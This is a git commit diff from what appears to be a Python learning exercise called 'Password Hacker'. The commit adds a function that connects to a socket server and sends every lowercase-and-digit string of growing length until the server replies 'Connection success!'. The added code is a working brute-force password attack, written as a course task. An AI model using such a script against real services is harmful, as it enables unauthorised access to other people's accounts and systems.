2d5d5ddf20d8903e6bf53d2309857a21df2ded33
radosan <radoslaw.sanetra@gmail.com>
2023-03-20 21:20:52 +0100

    added brute force password cracking

--- Password Hacker (Python)/task/hacking/hack.py
+++ Password Hacker (Python)/task/hacking/hack.py
@@ -1,21 +1,33 @@
+import itertools
 import socket
+import string
 import sys
 
 
 class PasswordHacker:
-    def __init__(self):
-        self.address = (sys.argv[1], int(sys.argv[2]))
-        self.msg = sys.argv[3]
+    def __init__(self, ip, port):
+        self.address = (ip, int(port))
+        self.client = None
 
     def get_data(self):
-        with socket.socket() as client:
-            client.connect(self.address)
-            client.send(self.msg.encode())
-            return client.recv(1024).decode()
+        with socket.socket() as self.client:
+            self.client.connect(self.address)
+            return self.force_crack()
+
+    def force_crack(self):
+        letters = string.ascii_lowercase + string.digits
+        n_letters = 0
+        while True:
+            n_letters += 1
+            for password in itertools.product(letters, repeat=n_letters):
+                password = ''.join(password)
+                self.client.send(password.encode())
+                if self.client.recv(1024).decode() == 'Connection success!':
+                    return password
 
 
 def main():
-    hacker = PasswordHacker()
+    hacker = PasswordHacker(*sys.argv[1:])
     print(hacker.get_data())
 
 
